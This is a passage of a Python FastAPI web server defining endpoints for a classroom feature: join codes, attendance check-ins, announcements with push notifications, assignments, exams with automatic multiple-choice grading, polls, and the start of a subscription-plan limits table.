        raise HTTPException(400, "A listing name is required.")
    lid = uuid.uuid4().hex[:10]
    try:
        price = max(0, int(data.get("price", 0) or 0))
    except Exception:
        price = 0
    db.coll_put("mkt_listings", lid,
                {"id": lid, "sid": sid, "author": name, "type": sanitize_text(str(data.get("type", "extension")), 20),
                 "name": name_v, "description": sanitize_text(str(data.get("description", "")), 2000),
                 "category": sanitize_text(str(data.get("category", "")), 40),
                 "pricing": sanitize_text(str(data.get("pricing", "free")), 20), "price": price,
                 "repo_url": sanitize_text(str(data.get("repo_url", "")), 300),
                 "status": "review", "installs": 0, "rating": 0,
                 "ts": datetime.datetime.utcnow().isoformat()}, owner=sid)
    return {"ok": True, "message": "Submitted for review"}


# ══════════════════════════════════════════════════════════════════
#  ACADEMIC CLASSES — shared lecturer<->student bridge (per-user spaces)
#  A lightweight class owned by a lecturer academic space (owner = the
#  creator's sid). Students link by a 6-char join code. Stored per-record
#  in the `collections` table (concurrency-safe); the roster is keyed by
#  owner=code so a single query returns a class's members. Distinct from
#  the global LECTURER_PASSWORD class system.
# ══════════════════════════════════════════════════════════════════

def _acad_gen_code() -> str:
    import string
    chars = string.ascii_uppercase + string.digits
    for _ in range(50):
        code = "".join(random.choices(chars, k=6))
        if not db.coll_get("acad_classes", code):
            return code
    return "".join(random.choices(chars, k=8))


def _acad_class_or_404(code: str) -> dict:
    cls = db.coll_get("acad_classes", code)
    if not cls:
        raise HTTPException(404, "Class not found. Check the join code.")
    return cls


def _acad_is_member(code: str, sid: str) -> bool:
    return db.coll_get("acad_members", f"{code}:{sid}") is not None


def _acad_require_owner(code: str, sid: str) -> dict:
    cls = _acad_class_or_404(code)
    if cls.get("owner_sid") != sid:
        raise HTTPException(403, "Only the class owner can do that.")
    return cls


@app.post("/api/acad/class/create")
async def acad_class_create(data: dict):
    """Lecturer publishes a class from their academic space; returns a join code."""
    sid, name = _resolve_token(data)
    cname   = sanitize_text(str(data.get("name", "")), 100) or "My Class"
    subject = sanitize_text(str(data.get("subject", "")), 100)
    code = _acad_gen_code()
    cls = {
        "code": code, "owner_sid": sid, "owner_name": name,
        "name": cname, "subject": subject,
        "created": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
        "live": None,
    }
    db.coll_put("acad_classes", code, cls, owner=sid)
    log.info(f"Acad class created: {cname} ({code}) by {sid[:12]}")
    return {"ok": True, "code": code, "class": cls}


@app.post("/api/acad/class/join")
async def acad_class_join(data: dict):
    """Student links their space to a class by code."""
    sid, name = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cls = _acad_class_or_404(code)
    if cls.get("owner_sid") == sid:
        raise HTTPException(400, "You own this class. You're already in it.")
    db.coll_put("acad_members", f"{code}:{sid}",
                {"code": code, "sid": sid, "name": name,
                 "joined": datetime.datetime.now().strftime("%Y-%m-%d %H:%M")},
                owner=code)
    return {"ok": True, "class": {"code": code, "name": cls.get("name"),
                                  "owner_name": cls.get("owner_name"), "subject": cls.get("subject")}}


@app.post("/api/acad/class/get")
async def acad_class_get(data: dict):
    """Fetch a class + roster. Visible to the owner or any member."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cls = _acad_class_or_404(code)
    is_owner = cls.get("owner_sid") == sid
    if not is_owner and not _acad_is_member(code, sid):
        raise HTTPException(403, "Join this class to view it.")
    roster = db.coll_list("acad_members", owner=code)
    return {"ok": True, "class": cls, "is_owner": is_owner,
            "members": roster, "member_count": len(roster)}


@app.post("/api/acad/class/mine")
async def acad_class_mine(data: dict):
    """Classes owned by the caller (lecturer side)."""
    sid, _ = _resolve_token(data)
    return {"ok": True, "classes": db.coll_list("acad_classes", owner=sid)}


@app.post("/api/acad/class/roster")
async def acad_class_roster(data: dict):
    """Owner-only roster of joined students."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    _acad_require_owner(code, sid)
    return {"ok": True, "members": db.coll_list("acad_members", owner=code)}


@app.post("/api/acad/class/leave")
async def acad_class_leave(data: dict):
    """Student leaves a class; an owner may remove a member via member_sid."""
    sid, _ = _resolve_token(data)
    code   = sanitize_text(str(data.get("code", "")), 12).upper()
    target = sanitize_text(str(data.get("member_sid", "")), 40) or sid
    if target != sid:
        _acad_require_owner(code, sid)   # only the owner can remove others
    db.coll_delete("acad_members", f"{code}:{target}")
    return {"ok": True}


# ── Live attendance (built on the class bridge) ──────────────────
#  Sessions in `acad_att_sessions` (owner=code); check-in records in
#  `acad_att_records` (owner=session_id). Attendance % counts ended
#  sessions only, so an in-progress session never penalises a student.
ACAD_ATT_WINDOW_MIN = 30   # how long a check-in code stays valid
ACAD_ATT_LATE_MIN   = 10   # checking in after this many minutes = "late"


def _acad_session_expired(s: dict) -> bool:
    try:
        return datetime.datetime.utcnow() >= datetime.datetime.fromisoformat(s.get("expires", ""))
    except Exception:
        return True


def _acad_open_session(code: str) -> dict | None:
    for s in db.coll_list("acad_att_sessions", owner=code):
        if s.get("open") and not _acad_session_expired(s):
            return s
    return None


@app.post("/api/acad/attendance/start")
async def acad_att_start(data: dict):
    """Owner starts an attendance session → returns a check-in code."""
    import string
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    _acad_require_owner(code, sid)
    # Close any sessions still open for this class.
    for s in db.coll_list("acad_att_sessions", owner=code):
        if s.get("open"):
            s["open"] = False
            db.coll_put("acad_att_sessions", s["session_id"], s, owner=code)
    now = datetime.datetime.utcnow()
    sess = {
        "session_id":   uuid.uuid4().hex[:12],
        "code":         code,
        "checkin_code": "".join(random.choices(string.ascii_uppercase + string.digits, k=5)),
        "started":      now.isoformat(),
        "expires":      (now + datetime.timedelta(minutes=ACAD_ATT_WINDOW_MIN)).isoformat(),
        "open":         True,
    }
    db.coll_put("acad_att_sessions", sess["session_id"], sess, owner=code)
    return {"ok": True, "session_id": sess["session_id"], "checkin_code": sess["checkin_code"], "expires": sess["expires"]}


@app.post("/api/acad/attendance/checkin")
async def acad_att_checkin(data: dict):
    """Member checks in with the live code → present (or late)."""
    sid, name = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cc   = sanitize_text(str(data.get("checkin_code", "")), 12).upper()
    cls = _acad_class_or_404(code)
    # Owner can check in too (so a single account testing both roles, or a lecturer
    # marking themselves present, isn't blocked). Otherwise must be a joined member.
    if cls.get("owner_sid") != sid and not _acad_is_member(code, sid):
        raise HTTPException(403, "Join the class first.")
    sess = _acad_open_session(code)
    if not sess:
        raise HTTPException(400, "No attendance session is open right now.")
    if sess.get("checkin_code") != cc:
        raise HTTPException(400, "Wrong check-in code.")
    now = datetime.datetime.utcnow()
    try:
        late = (now - datetime.datetime.fromisoformat(sess["started"])).total_seconds() > ACAD_ATT_LATE_MIN * 60
    except Exception:
        late = False
    status = "late" if late else "present"
    db.coll_put("acad_att_records", f"{sess['session_id']}:{sid}",
                {"session_id": sess["session_id"], "code": code, "sid": sid, "name": name,
                 "ts": now.isoformat(), "status": status},
                owner=sess["session_id"])
    return {"ok": True, "status": status}


@app.post("/api/acad/attendance/session")
async def acad_att_session(data: dict):
    """Owner polls the live roster for an active session."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    _acad_require_owner(code, sid)
    session_id = sanitize_text(str(data.get("session_id", "")), 20)
    recs   = db.coll_list("acad_att_records", owner=session_id)
    roster = db.coll_list("acad_members", owner=code)
    return {"ok": True, "records": recs, "present_count": len(recs), "total": len(roster)}


@app.post("/api/acad/attendance/end")
async def acad_att_end(data: dict):
    """Owner ends a session (records become part of the register)."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    _acad_require_owner(code, sid)
    session_id = sanitize_text(str(data.get("session_id", "")), 20)
    sess = db.coll_get("acad_att_sessions", session_id)
    if sess:
        sess["open"] = False
        sess["ended"] = datetime.datetime.utcnow().isoformat()
        db.coll_put("acad_att_sessions", session_id, sess, owner=code)
    return {"ok": True, "present_count": len(db.coll_list("acad_att_records", owner=session_id))}


@app.post("/api/acad/attendance/register")
async def acad_att_register(data: dict):
    """Owner-only register: per-student attendance % across ended sessions."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    _acad_require_owner(code, sid)
    sessions = [s for s in db.coll_list("acad_att_sessions", owner=code) if not s.get("open")]
    total = len(sessions)
    present: dict = {}
    for s in sessions:
        for r in db.coll_list("acad_att_records", owner=s["session_id"]):
            present[r["sid"]] = present.get(r["sid"], 0) + 1
    rows = [{"sid": m["sid"], "name": m["name"], "present": present.get(m["sid"], 0),
             "total": total, "pct": round(present.get(m["sid"], 0) / total * 100) if total else 0}
            for m in db.coll_list("acad_members", owner=code)]
    return {"ok": True, "sessions": total, "rows": rows}


@app.post("/api/acad/attendance/mine")
async def acad_att_mine(data: dict):
    """Member's own attendance % for a class + whether a session is open now."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    if not _acad_is_member(code, sid):
        raise HTTPException(403, "Join the class first.")
    sessions = [s for s in db.coll_list("acad_att_sessions", owner=code) if not s.get("open")]
    total = len(sessions)
    present = sum(1 for s in sessions if db.coll_get("acad_att_records", f"{s['session_id']}:{sid}"))
    return {"ok": True, "present": present, "total": total,
            "pct": round(present / total * 100) if total else 0,
            "open_session": _acad_open_session(code) is not None}


# ── Announcements + web push + feed (built on the class bridge) ──
def _acad_push_members(code: str, title: str, body: str, url: str = "/app") -> None:
    """Fire a web push to every member of a class (best-effort)."""
    for m in db.coll_list("acad_members", owner=code):
        try:
            send_push(m.get("sid", ""), title, body, url, f"acad_{code}")
        except Exception:
            pass


@app.post("/api/acad/announce")
async def acad_announce(data: dict, bg: BackgroundTasks):
    """Owner posts an announcement; members get a web-push notification."""
    sid, name = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cls = _acad_require_owner(code, sid)
    text = sanitize_text(str(data.get("text", "")), 1000)
    if not text:
        raise HTTPException(400, "Announcement text is required.")
    ann = {"id": uuid.uuid4().hex[:10], "code": code, "text": text,
           "author": name, "ts": datetime.datetime.utcnow().isoformat()}
    db.coll_put("acad_announcements", ann["id"], ann, owner=code)
    bg.add_task(_acad_push_members, code, f"📢 {cls.get('name', 'Class')}", text, "/app")
    return {"ok": True, "announcement": ann}


@app.post("/api/acad/announce/delete")
async def acad_announce_delete(data: dict):
    """Owner removes an announcement."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    _acad_require_owner(code, sid)
    db.coll_delete("acad_announcements", sanitize_text(str(data.get("id", "")), 20))
    return {"ok": True}


@app.post("/api/acad/feed")
async def acad_feed(data: dict):
    """Announcements for a class — visible to the owner or any member."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cls = _acad_class_or_404(code)
    if cls.get("owner_sid") != sid and not _acad_is_member(code, sid):
        raise HTTPException(403, "Join this class to view its feed.")
    anns = sorted(db.coll_list("acad_announcements", owner=code),
                  key=lambda a: a.get("ts", ""), reverse=True)
    return {"ok": True, "class_name": cls.get("name"), "announcements": anns[:50]}


# ── Gradebook: shared assignments + submissions + grading ────────
#  acad_assignments (owner=code) · acad_submissions (owner=assignment_id,
#  item_id="{aid}:{sid}").
@app.post("/api/acad/assignment/create")
async def acad_assignment_create(data: dict, bg: BackgroundTasks):
    """Owner posts a class assignment (members notified)."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cls = _acad_require_owner(code, sid)
    title = sanitize_text(str(data.get("title", "")), 200)
    if not title:
        raise HTTPException(400, "Assignment title is required.")
    a = {"id": uuid.uuid4().hex[:10], "code": code, "title": title,
         "due": sanitize_text(str(data.get("due", "")), 40),
         "points": sanitize_text(str(data.get("points", "")), 10),
         "created": datetime.datetime.utcnow().isoformat()}
    db.coll_put("acad_assignments", a["id"], a, owner=code)
    bg.add_task(_acad_push_members, code, f"📝 {cls.get('name', 'Class')}: new assignment", title, "/app")
    return {"ok": True, "assignment": a}


@app.post("/api/acad/assignment/list")
async def acad_assignment_list(data: dict):
    """Class assignments — owner or member."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cls = _acad_class_or_404(code)
    if cls.get("owner_sid") != sid and not _acad_is_member(code, sid):
        raise HTTPException(403, "Join this class first.")
    items = sorted(db.coll_list("acad_assignments", owner=code), key=lambda a: a.get("created", ""), reverse=True)
    return {"ok": True, "assignments": items}


@app.post("/api/acad/assignment/delete")
async def acad_assignment_delete(data: dict):
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    _acad_require_owner(code, sid)
    aid = sanitize_text(str(data.get("id", "")), 20)
    db.coll_delete("acad_assignments", aid)
    return {"ok": True}


# ── Acad exams (Stage 6 rebuild) ───────────────────────────────
# v3-native exam bank: per-lecturer (owner=sid), normal session token — fixes
# the verify_lecturer()/lec_-token 401 that blocked the v3 Exam Builder. The old
# /api/lecturer/exam* (global LECTURER_PASSWORD bank) is left intact for the
# legacy /lecturer dashboard. Owner-scoped + id-based (no index-delete race).

@app.post("/api/acad/exam/create")
async def acad_exam_create(data: dict):
    """Lecturer creates an exam in their own bank (normal session token)."""
    sid, name = _resolve_token(data)
    title = sanitize_text(str(data.get("title", "")), 200)
    if not title:
        raise HTTPException(400, "Exam title is required.")
    questions = [_parse_exam_q(str(q)) for q in data.get("questions", [])[:100] if str(q).strip()]
    if not questions:
        raise HTTPException(400, "Add at least one question to the bank.")
    exam = {
        "id":                   uuid.uuid4().hex[:10],
        "owner_sid":            sid,
        "title":                title,
        "questions":            questions,
        "questions_per_student": min(max(int(data.get("questions_per_student", 30)), 1), 100),
        "duration":             min(max(int(data.get("duration", 60)), 1), 300),
        "lecturer":             sanitize_text(str(data.get("lecturer", name)), MAX_NAME_LEN),
        "created":              datetime.datetime.utcnow().isoformat(),
    }
    db.coll_put("acad_exams", exam["id"], exam, owner=sid)
    return {"ok": True, "exam": exam}


@app.post("/api/acad/exam/list")
async def acad_exam_list(data: dict):
    """The caller's own exam bank."""
    sid, _ = _resolve_token(data)
    exams = sorted(db.coll_list("acad_exams", owner=sid),
                   key=lambda e: e.get("created", ""), reverse=True)
    return {"ok": True, "exams": exams}


@app.post("/api/acad/exam/delete")
async def acad_exam_delete(data: dict):
    """Delete one of your own exams by id (owner-scoped)."""
    sid, _ = _resolve_token(data)
    exam_id = sanitize_text(str(data.get("exam_id", "")), 20)
    exam = db.coll_get("acad_exams", exam_id)
    if not exam or exam.get("owner_sid") != sid:
        raise HTTPException(404, "Exam not found.")
    db.coll_delete("acad_exams", exam_id)
    return {"ok": True}


@app.post("/api/acad/exam/assign")
async def acad_exam_assign(data: dict, bg: BackgroundTasks):
    """Assign one of your exams to a class you own; members are notified."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cls = _acad_require_owner(code, sid)
    exam_id = sanitize_text(str(data.get("exam_id", "")), 20)
    exam = db.coll_get("acad_exams", exam_id)
    if not exam or exam.get("owner_sid") != sid:
        raise HTTPException(404, "Exam not found.")
    rec = {
        "id":                   f"{code}:{exam_id}",
        "code":                 code,
        "exam_id":              exam_id,
        "title":                exam["title"],
        "questions_per_student": exam.get("questions_per_student", 30),
        "duration":             exam.get("duration", 60),
        "assigned":             datetime.datetime.utcnow().isoformat(),
    }
    db.coll_put("acad_class_exams", rec["id"], rec, owner=code)
    bg.add_task(_acad_push_members, code, f"📝 {cls.get('name', 'Class')}: new exam", exam["title"], "/app")
    return {"ok": True, "assignment": rec}


# ── Acad exam student take-flow ────────────────────────────────
#  acad_class_exams (owner=code) = the assignment; acad_exams (owner=lecturer
#  sid) holds the question bank; acad_exam_results (owner="{code}:{exam_id}",
#  id="{code}:{exam_id}:{sid}") = one student's answers. Each student gets a
#  deterministic random subset of the bank (questions_per_student).

def _parse_exam_q(raw: str):
    """One bank line. Pipe syntax 'Question? | optA | *optB | optC' → an MCQ
    question (the *-prefixed option is the correct one); any line without a pipe
    stays a plain free-text question string (backward-compatible)."""
    raw = str(raw).strip()
    if "|" in raw:
        parts = [p.strip() for p in raw.split("|")]
        q = sanitize_text(parts[0], 500)
        opts, correct = [], 0
        for o in parts[1:]:
            o = o.strip()
            if not o:
                continue
            if o.startswith("*"):
                correct = len(opts)
                o = o[1:].strip()
            if o:
                opts.append(sanitize_text(o, 200))
        opts = opts[:8]
        if q and len(opts) >= 2:
            return {"q": q, "type": "mcq", "options": opts, "correct": min(correct, len(opts) - 1)}
    return sanitize_text(raw, 500)


def _exam_q_public(q):
    """Student-facing shape of a bank question — never includes the MCQ answer."""
    if isinstance(q, dict):
        return {"q": q.get("q", ""), "type": "mcq", "options": q.get("options", []) or []}
    return {"q": str(q), "type": "text"}


def _exam_questions_for(exam: dict, sid: str) -> list:
    """Deterministic per-student subset of the exam's question bank (stable on reload).
    MCQ questions are returned without their correct answer."""
    qs = exam.get("questions", []) or []
    if not qs:
        return []
    n = min(int(exam.get("questions_per_student", len(qs)) or len(qs)), len(qs))
    seed = int(hashlib.sha256(f"{exam.get('id','')}:{sid}".encode()).hexdigest(), 16) % (2**32)
    idxs = list(range(len(qs)))
    random.Random(seed).shuffle(idxs)
    return [{"i": i, **_exam_q_public(qs[i])} for i in sorted(idxs[:n])]


@app.post("/api/acad/exam/assigned")
async def acad_exam_assigned(data: dict):
    """Exams assigned to a class — owner or member; annotated with the caller's status."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cls = _acad_class_or_404(code)
    if cls.get("owner_sid") != sid and not _acad_is_member(code, sid):
        raise HTTPException(403, "Join this class first.")
    items = sorted(db.coll_list("acad_class_exams", owner=code),
                   key=lambda e: e.get("assigned", ""), reverse=True)
    out = []
    for it in items:
        res = db.coll_get("acad_exam_results", f"{code}:{it.get('exam_id','')}:{sid}")
        out.append({**it, "submitted": bool(res),
                    "graded": bool(res and res.get("graded")),
                    "grade": (res or {}).get("grade", ""),
                    "auto_pct": (res or {}).get("auto", {}).get("auto_pct")})
    return {"ok": True, "exams": out}


@app.post("/api/acad/exam/take")
async def acad_exam_take(data: dict):
    """Member fetches their question subset for an assigned exam (+ any prior submission)."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    if not _acad_is_member(code, sid):
        raise HTTPException(403, "Join the class first.")
    exam_id = sanitize_text(str(data.get("exam_id", "")), 20)
    if not db.coll_get("acad_class_exams", f"{code}:{exam_id}"):
        raise HTTPException(404, "Exam not assigned to this class.")
    exam = db.coll_get("acad_exams", exam_id)
    if not exam:
        raise HTTPException(404, "Exam not found.")
    res = db.coll_get("acad_exam_results", f"{code}:{exam_id}:{sid}")
    return {"ok": True, "exam": {
        "id": exam_id, "title": exam.get("title", "Exam"),
        "duration": exam.get("duration", 60),
        "questions": _exam_questions_for(exam, sid),
    }, "submission": res}


@app.post("/api/acad/exam/submit")
async def acad_exam_submit(data: dict):
    """Member submits exam answers (overwrites a prior ungraded attempt)."""
    sid, name = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    if not _acad_is_member(code, sid):
        raise HTTPException(403, "Join the class first.")
    exam_id = sanitize_text(str(data.get("exam_id", "")), 20)
    if not db.coll_get("acad_class_exams", f"{code}:{exam_id}"):
        raise HTTPException(404, "Exam not assigned to this class.")
    prev = db.coll_get("acad_exam_results", f"{code}:{exam_id}:{sid}")
    if prev and prev.get("graded"):
        raise HTTPException(409, "This exam has already been graded.")
    answers = data.get("answers", []) or []
    clean = [{"i": int(a.get("i", 0)),
              "q": sanitize_text(str(a.get("q", "")), 500),
              "a": sanitize_text(str(a.get("a", "")), 3000)} for a in answers[:100]]
    # Auto-grade MCQ answers against the bank (free-text is left for manual grading).
    bank = (db.coll_get("acad_exams", exam_id) or {}).get("questions", []) or []
    mcq_total = mcq_correct = 0
    for ans in clean:
        i = ans["i"]
        q = bank[i] if 0 <= i < len(bank) else None
        if isinstance(q, dict) and q.get("type") == "mcq":
            mcq_total += 1
            opts = q.get("options", []) or []
            cidx = q.get("correct", -1)
            correct_text = opts[cidx] if isinstance(cidx, int) and 0 <= cidx < len(opts) else None
            ans["correct"] = (correct_text is not None and ans["a"] == correct_text)
            if ans["correct"]:
                mcq_correct += 1
    auto = {"mcq_total": mcq_total, "mcq_correct": mcq_correct,
            "auto_pct": round(100 * mcq_correct / mcq_total) if mcq_total else None}
    db.coll_put("acad_exam_results", f"{code}:{exam_id}:{sid}",
                {"exam_id": exam_id, "code": code, "sid": sid, "name": name, "answers": clean,
                 "auto": auto,
                 "submitted_at": datetime.datetime.utcnow().isoformat(),
                 "graded": False, "grade": "", "feedback": ""},
                owner=f"{code}:{exam_id}")
    return {"ok": True, "auto": auto}


@app.post("/api/acad/exam/results")
async def acad_exam_results(data: dict):
    """Owner: all student results for an assigned exam."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    _acad_require_owner(code, sid)
    exam_id = sanitize_text(str(data.get("exam_id", "")), 20)
    return {"ok": True, "results": db.coll_list("acad_exam_results", owner=f"{code}:{exam_id}")}


@app.post("/api/acad/exam/grade")
async def acad_exam_grade(data: dict, bg: BackgroundTasks):
    """Owner grades an exam result; the student is notified."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cls = _acad_require_owner(code, sid)
    exam_id = sanitize_text(str(data.get("exam_id", "")), 20)
    target = sanitize_text(str(data.get("sid", "")), 40)
    res = db.coll_get("acad_exam_results", f"{code}:{exam_id}:{target}")
    if not res:
        raise HTTPException(404, "No submission found.")
    res["grade"]    = sanitize_text(str(data.get("grade", "")), 20)
    res["feedback"] = sanitize_text(str(data.get("feedback", "")), 2000)
    res["graded"]   = True
    db.coll_put("acad_exam_results", f"{code}:{exam_id}:{target}", res, owner=f"{code}:{exam_id}")
    bg.add_task(send_push, target, f"✅ {cls.get('name', 'Class')}: exam graded",
                f"You scored {res['grade']}", "/app", f"acad_{code}")
    return {"ok": True}


@app.post("/api/acad/submit")
async def acad_submit(data: dict):
    """Member submits work for an assignment (re-submit overwrites)."""
    sid, name = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    if not _acad_is_member(code, sid):
        raise HTTPException(403, "Join the class first.")
    aid = sanitize_text(str(data.get("assignment_id", "")), 20)
    if not db.coll_get("acad_assignments", aid):
        raise HTTPException(404, "Assignment not found.")
    db.coll_put("acad_submissions", f"{aid}:{sid}",
                {"assignment_id": aid, "code": code, "sid": sid, "name": name,
                 "text": sanitize_text(str(data.get("text", "")), 5000),
                 "ts": datetime.datetime.utcnow().isoformat(),
                 "graded": False, "grade": "", "feedback": ""},
                owner=aid)
    return {"ok": True}


@app.post("/api/acad/submissions")
async def acad_submissions(data: dict):
    """Owner: all submissions for an assignment."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    _acad_require_owner(code, sid)
    aid = sanitize_text(str(data.get("assignment_id", "")), 20)
    return {"ok": True, "submissions": db.coll_list("acad_submissions", owner=aid)}


@app.post("/api/acad/grade")
async def acad_grade(data: dict, bg: BackgroundTasks):
    """Owner grades a submission; the student is notified."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cls = _acad_require_owner(code, sid)
    aid = sanitize_text(str(data.get("assignment_id", "")), 20)
    target = sanitize_text(str(data.get("sid", "")), 40)
    sub = db.coll_get("acad_submissions", f"{aid}:{target}")
    if not sub:
        raise HTTPException(404, "Submission not found.")
    sub["grade"]    = sanitize_text(str(data.get("grade", "")), 20)
    sub["feedback"] = sanitize_text(str(data.get("feedback", "")), 2000)
    sub["graded"]   = True
    db.coll_put("acad_submissions", f"{aid}:{target}", sub, owner=aid)
    bg.add_task(send_push, target, f"✅ {cls.get('name', 'Class')}: graded",
                f"You scored {sub['grade']}", "/app", f"acad_{code}")
    return {"ok": True}


@app.post("/api/acad/grades/mine")
async def acad_grades_mine(data: dict):
    """Member: their submission + grade for each class assignment."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    if not _acad_is_member(code, sid):
        raise HTTPException(403, "Join the class first.")
    out = []
    for a in db.coll_list("acad_assignments", owner=code):
        sub = db.coll_get("acad_submissions", f"{a['id']}:{sid}")
        out.append({"assignment_id": a["id"], "title": a.get("title"), "due": a.get("due"),
                    "submitted": sub is not None, "graded": bool(sub and sub.get("graded")),
                    "grade": (sub or {}).get("grade", ""), "feedback": (sub or {}).get("feedback", "")})
    return {"ok": True, "items": out}


# ── Live session + in-class polls (built on the class bridge) ────
@app.post("/api/acad/live/set")
async def acad_live_set(data: dict, bg: BackgroundTasks):
    """Owner marks the class live with a join link; members notified."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cls = _acad_require_owner(code, sid)
    cls["live"] = {"link": sanitize_text(str(data.get("link", "")), 500),
                   "title": sanitize_text(str(data.get("title", "")), 200) or "Live class",
                   "started": datetime.datetime.utcnow().isoformat()}
    db.coll_put("acad_classes", code, cls, owner=cls.get("owner_sid", sid))
    bg.add_task(_acad_push_members, code, f"🔴 {cls.get('name', 'Class')} is live", cls["live"]["title"], cls["live"]["link"] or "/app")
    return {"ok": True, "live": cls["live"]}


@app.post("/api/acad/live/clear")
async def acad_live_clear(data: dict):
    """Owner ends the live session."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cls = _acad_require_owner(code, sid)
    cls["live"] = None
    db.coll_put("acad_classes", code, cls, owner=cls.get("owner_sid", sid))
    return {"ok": True}


@app.post("/api/acad/poll/create")
async def acad_poll_create(data: dict, bg: BackgroundTasks):
    """Owner opens a poll for the class."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cls = _acad_require_owner(code, sid)
    q = sanitize_text(str(data.get("question", "")), 300)
    opts = [sanitize_text(str(o), 120) for o in (data.get("options") or []) if str(o).strip()][:6]
    if not q or len(opts) < 2:
        raise HTTPException(400, "A question and at least 2 options are required.")
    poll = {"id": uuid.uuid4().hex[:10], "code": code, "question": q, "options": opts,
            "open": True, "created": datetime.datetime.utcnow().isoformat()}
    db.coll_put("acad_polls", poll["id"], poll, owner=code)
    bg.add_task(_acad_push_members, code, f"📊 {cls.get('name', 'Class')}: new poll", q, "/app")
    return {"ok": True, "poll": poll}


def _acad_poll_tally(poll: dict) -> dict:
    votes = db.coll_list("acad_poll_votes", owner=poll["id"])
    counts = [0] * len(poll.get("options", []))
    for v in votes:
        i = v.get("option", -1)
        if 0 <= i < len(counts):
            counts[i] += 1
    return {"id": poll["id"], "question": poll["question"], "options": poll["options"],
            "counts": counts, "total": len(votes), "open": poll.get("open", True)}


@app.post("/api/acad/poll/list")
async def acad_poll_list(data: dict):
    """Open polls for a class (with tallies) — owner or member."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    cls = _acad_class_or_404(code)
    if cls.get("owner_sid") != sid and not _acad_is_member(code, sid):
        raise HTTPException(403, "Join this class first.")
    polls = [p for p in db.coll_list("acad_polls", owner=code) if p.get("open")]
    polls.sort(key=lambda p: p.get("created", ""), reverse=True)
    mine = {}
    for p in polls:
        v = db.coll_get("acad_poll_votes", f"{p['id']}:{sid}")
        if v:
            mine[p["id"]] = v.get("option")
    return {"ok": True, "polls": [_acad_poll_tally(p) for p in polls], "my_votes": mine}


@app.post("/api/acad/poll/vote")
async def acad_poll_vote(data: dict):
    """Member votes (one vote per poll; re-voting moves the vote)."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    if not _acad_is_member(code, sid):
        raise HTTPException(403, "Join the class first.")
    pid = sanitize_text(str(data.get("poll_id", "")), 20)
    poll = db.coll_get("acad_polls", pid)
    if not poll or not poll.get("open"):
        raise HTTPException(400, "Poll is closed.")
    try:
        idx = int(data.get("option_index", -1))
    except Exception:
        idx = -1
    if not (0 <= idx < len(poll.get("options", []))):
        raise HTTPException(400, "Invalid option.")
    db.coll_put("acad_poll_votes", f"{pid}:{sid}", {"poll_id": pid, "sid": sid, "option": idx}, owner=pid)
    return {"ok": True, "results": _acad_poll_tally(poll)}


@app.post("/api/acad/poll/close")
async def acad_poll_close(data: dict):
    """Owner closes a poll."""
    sid, _ = _resolve_token(data)
    code = sanitize_text(str(data.get("code", "")), 12).upper()
    _acad_require_owner(code, sid)
    pid = sanitize_text(str(data.get("poll_id", "")), 20)
    poll = db.coll_get("acad_polls", pid)
    if poll:
        poll["open"] = False
        db.coll_put("acad_polls", pid, poll, owner=code)
    return {"ok": True}


def _plan_is_active(p: dict) -> bool:
    """True if the user holds a non-expired paid subscription."""
    sub  = p.get("subscription") or {}
    plan = sub.get("plan", "free")
    if not plan or plan == "free":
        return False
    if sub.get("status") and sub["status"] != "active":
        return False
    exp = sub.get("expires")
    if exp:
        try:
            if datetime.datetime.utcnow() > datetime.datetime.strptime(exp, "%Y-%m-%d"):
                return False
        except ValueError:
            pass
    return True


# ── Plan feature caps (quota gating) ───────────────────────────────
# Single source of truth for per-plan limits. None = unlimited. Tune freely.
# `analytics_days` caps the analytics history window; `spaces` caps personal
# spaces; templates/integrations are surfaced to the client (soft) for now.
_PLAN_CAPS = {
    "Free":         {"spaces": 1,    "templates": 3,    "integrations": 1,    "analytics_days": 7,    "ai_chat_daily": FREE_DAILY_CHAT,    "ai_actions_daily": AI_DAILY_FREE},
